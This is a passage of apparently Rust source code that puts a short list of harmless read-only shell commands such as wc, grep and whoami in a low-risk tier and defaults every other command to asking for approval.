            | "file"
            | "wc"
            | "grep"
            | "true"
            | "false"
            | "whoami"
            | "uname"
            | "date"
    ) {
        return Tier::T0;
    }

    // Cautious default: ask.
    Tier::T1
}
